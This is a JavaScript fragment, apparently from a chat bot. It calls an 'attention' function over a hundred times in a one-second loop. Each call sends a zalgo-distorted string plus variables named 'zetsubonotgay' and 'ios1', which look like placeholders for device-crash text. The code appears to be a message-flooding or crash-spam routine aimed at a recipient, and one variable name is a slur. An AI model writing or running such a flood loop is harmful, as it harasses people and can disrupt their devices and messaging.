await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
